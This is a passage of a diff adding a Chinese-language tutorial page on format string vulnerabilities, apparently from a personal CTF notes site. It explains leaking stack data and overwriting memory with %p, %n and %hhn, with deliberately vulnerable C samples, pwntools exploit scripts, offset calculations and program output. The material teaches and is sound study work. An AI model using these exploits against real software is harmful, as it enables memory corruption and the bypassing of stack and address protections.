+  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0x22222222</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%08x.%08x.%08x.%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>    <span class="c1">//格式化字符串漏洞</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>32 位程序使用的是栈传参，64 位系统前 7 个参数是用寄存器传参。32 位程序可以直接利用格式化字符串泄露出存在栈上的参数。（64 位要对应调整）</p>
+<p>编译 32 位程序：</p>
+<div class="highlight"><pre><span></span><code>gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
+</code></pre></div>
+<p>输入输出如下：</p>
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt;%p.%p.%p
+<span class="m">00000001</span>.22222222.ffffffff.%p.%p.%p
+0xffffcd10.0xc2.0xf7e8b6bb
+</code></pre></div>
+<p>栈情况：</p>
+<div class="highlight"><pre><span></span><code>────<span class="o">[</span> stack <span class="o">]</span>────
+<span class="o">[</span><span class="s1">&#39;0xffffccfc&#39;</span>, <span class="s1">&#39;l8&#39;</span><span class="o">]</span>
+<span class="m">8</span>
+0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← <span class="nv">$esp</span>
+0xffffcd00│+0x04: 0xffffcd10  →  <span class="s2">&quot;%08x.%08x.%08x&quot;</span>
+<span class="c1"># 开始泄露位置</span>
+0xffffcd04│+0x08: 0xffffcd10  →  <span class="s2">&quot;%08x.%08x.%08x&quot;</span>
+0xffffcd08│+0x0c: 0x000000c2
+0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10
+0xffffcd10│+0x14: <span class="s2">&quot;%08x.%08x.%08x&quot;</span>   ← <span class="nv">$eax</span>
+0xffffcd14│+0x18: <span class="s2">&quot;.%08x.%08x&quot;</span>
+0xffffcd18│+0x1c: <span class="s2">&quot;x.%08x&quot;</span>
+</code></pre></div>
+<h3 id="_4">泄露任意地址内存<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>上面已经实现依次获取栈中的每个参数，通过像下面这样构造，直接获取指定为位置的参数：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 第n个参数</span>
+%n<span class="nv">$p</span>
+</code></pre></div>
+<p>只要知道目标数据在栈上的偏移 n ，就能够获取。</p>
+<h3 id="_5">小总结<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<h4 id="_6">会用来泄露什么<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<p>理论上任何栈上数据都能被泄露出来，目前遇到过的有以下这些：</p>
+<ul>
+<li>Canary</li>
+</ul>
+<p>泄露出 Canary 的值，从而绕过 Canary 保护。</p>
+<ul>
+<li>text 段地址</li>
+</ul>
+<p>泄露出 text 段的真实地址，从而绕过 PIE 对于 text 段的保护，为 ROP 实现提供基础。</p>
+<ul>
+<li>libc 函数地址</li>
+</ul>
+<p>泄露 libc 函数地址，获取 libc base addr 。这里也可以用来是绕过 PIE 保护，但泄露 libc 地址意义不止于此。</p>
+<ul>
+<li>某些变量</li>
+</ul>
+<p>有些题目会有 if 判断输入值等是否与预先设定的值相等，以此增加难度。</p>
+<h4 id="_7">关键字选择<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<ol>
+<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>
+<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>
+<li>利用 %order<span><span class="MathJax_Preview">x 来获取指定参数的值，利用 %order</span><script type="math/tex">x 来获取指定参数的值，利用 %order</script></span>s 来获取指定参数对应地址的内容。</li>
+</ol>
+<h2 id="_8">覆盖内存<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<p>覆盖内存使用的 <code>%n</code>和 <code>%c</code> 配合实现。</p>
+<ul>
+<li>c</li>
+</ul>
+<p>简单点来说就是产生几个 null 字符。</p>
+<ul>
+<li>n</li>
+</ul>
+<p>不输出字符，但将成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<p>写入的时候也有多种方式：</p>
+<ul>
+<li>n：int</li>
+<li>hn：short int 写入双字节</li>
+<li>hhn：char int 写入单字节</li>
+</ul>
+<p>给出如下的程序来介绍相应的部分（32位）：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* example/overflow/overflow.c */</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">456</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">789</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;modified c.&quot;</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;modified a for a small number.&quot;</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">==</span> <span class="mh">0x12345678</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;modified b for a big number!&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="_9">覆盖任意地址<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<h4 id="_10">覆盖小数字<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<p>这里以将 a 覆盖为 2 为例。需要将覆盖的目标地址后置，因为机器字长为 4 （64 位是 8）。</p>
+<p>构造字符串如下：</p>
+<div class="highlight"><pre><span></span><code>aa%k$nxx[addr]
+</code></pre></div>
+<p><code>aa</code> 两个可见字符，所以最后会向目标地址写入 2 。<code>k</code> 目标地址的偏移位置。<code>xx</code> 让字符串对其机器字长，这里是 4 。<code>[addr]</code> 覆盖的目标地址。</p>
+<h5 id="_11">怎么对齐<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h5>
+<p>对齐方法在 32 64 程序中，覆盖大数字、小数字中都通用，以上面这个为例。python 使用 len 计算长度后，用机器字长取余，余数就是对齐长度。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 32位机器字长：4</span>
+<span class="c1"># 64位机器字长：8</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="s2">&quot;aa%k$n&quot;</span><span class="p">)</span><span class="o">%</span><span class="mi">4</span>
+<span class="mi">2</span>
+</code></pre></div>
+<p>第一个可控字符偏移是 6 ，<code>aa%k$nxx</code> 长度为 8 （不会算就 python len），所以 k 偏移应该是 8 。</p>
+<p>构造覆盖小数字利用代码：</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">fora</span><span class="p">():</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./overwrite&#39;</span><span class="p">)</span>
+    <span class="n">a_addr</span> <span class="o">=</span> <span class="mh">0x0804A024</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;aa%8$naa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_addr</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>对应的结果如下</p>
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt;python exploit.py
+0xffc1729c
+aaaa$\xa0\x0modified a for a small number.
+</code></pre></div>
+<h4 id="_12">覆盖大数字<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<p>覆盖基本结构和上面差不多，区别是通常是覆盖大数字会分次覆盖，避免一下数据太大而不成功，所以会用到标志 <code>hhn</code> 或 <code>hn</code> 。</p>
+<p>还是使用上面例题，写入的目标地址为 0x0804A028 。使用单字节写入（hhn），写入值为 <code>0x12345678</code> 。变量是小端序存储，也在内存中是这样的：<code>\x78\x56\x34\x12</code> ，简单点就是从右向左覆盖。</p>
+<div class="highlight"><pre><span></span><code>0x0804A028 \x78
+0x0804A029 \x56
+0x0804A02a \x34
+0x0804A02b \x12
+</code></pre></div>
+<p>为了与覆盖小数字统一，避免计算地址占用字长，将地址放置在字符串末尾，得出以下框架：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 格式化字符串</span>
+<span class="n">payload</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">%x</span><span class="s2">c%y$hhn</span><span class="si">%x</span><span class="s2">c%y$hhn</span><span class="si">%x</span><span class="s2">c%y$hhn</span><span class="si">%x</span><span class="s2">c%y$hhn&quot;</span>
+<span class="c1"># 目标地址</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A028</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A028</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A028</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A028</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+</code></pre></div>
+<p><code>x</code> 控制输出多少个 null 字符。<code>y</code> 写入地址的偏移量。</p>
+<h5 id="c">手工计算 c 生成字符数<a class="headerlink" href="#c" title="Permanent link">&para;</a></h5>
+<p>写入顺序为：0x78、0x56、0x34、0x12</p>
+<div class="highlight"><pre><span></span><code>需要写入0x78，已经存储0x0字符
+0x78=120
+x1=120
+---
+需要写入0x56，已经存储0x78字符
+0x156溢出单字节上限，忽略进位，存储0x56
+0x156-0x78=222
+x2=222
+---
+需要写入0x34，已经存储0x156字符
+0x234溢出单字节上限，忽略进位，存储0x34
+0x234-0x156=222
+x3=222
+---
+需要写入0x12，已经存储0x234字符
+0x312溢出单字节上限，忽略进位，存储0x12
+0x312-0x234=222
+x4=222
+---
+</code></pre></div>
+<p>得到结果：<code>payload="%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn"</code> ，长度是 44 ，预估地址偏移是两位数字，再进行一下修改，计算对齐长度为 0 ，最后 payload 为：</p>
+<div class="highlight"><pre><span></span><code>payload=&quot;%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn&quot;
+payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3)
+</code></pre></div>
+<h3 id="_13">覆盖栈内存<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<h4 id="_14">确定覆盖地址<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<p>覆盖那里内容都好，覆盖地址肯定要明确的，覆盖栈上变量也是需要的。变量地址一般会存放在栈上，我们就需要找到栈存放这个变量地址的偏移。</p>
+<h4 id="_15">确定相对偏移<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<p>调试在 printf 打断点：</p>
+<div class="highlight"><pre><span></span><code>────[ stack ]────
+[&#39;0xffffcd0c&#39;, &#39;l8&#39;]
+8
+0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10     ← $esp
+0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;
+0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315
+0xffffcd18│+0x0c: 0x000000c2
+0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10
+0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000
+0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;
+0xffffcd28│+0x1c: &quot;%d%d&quot;     ← $eax
+</code></pre></div>
+<p>在 0xffffcd14 处存储着变量 c 的地址。偏移量为 6 。</p>
+<h4 id="_16">进行覆盖<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
+<p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p>
+<div class="highlight"><pre><span></span><code>[addr of c]%012d%6$n
+</code></pre></div>
+<p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p>
+<p>具体脚本如下</p>
+<div class="highlight"><pre><span></span><code>def forc():
+    sh = process(&#39;./overwrite&#39;)
+    c_addr = int(sh.recvuntil(&#39;\n&#39;, drop=True), 16)
+    print hex(c_addr)
+    payload = p32(c_addr) + &#39;%012d&#39; + &#39;%6$n&#39;
+    print payload
+    #gdb.attach(sh)
+    sh.sendline(payload)
+    print sh.recv()
+    sh.interactive()
+
+forc()
+</code></pre></div>
+<p>结果如下</p>
+<div class="highlight"><pre><span></span><code>➜  overwrite git:(master) ✗ python exploit.py
+[+] Starting local process &#39;./overwrite&#39;: pid 74806
+0xfffd8cdc
+܌��%012d%6$n
+܌��-00000160648modified c.
+</code></pre></div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                格式化字符串漏洞基础例子
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                格式化字符串盲打
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: ['tabs', 'instant'],
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
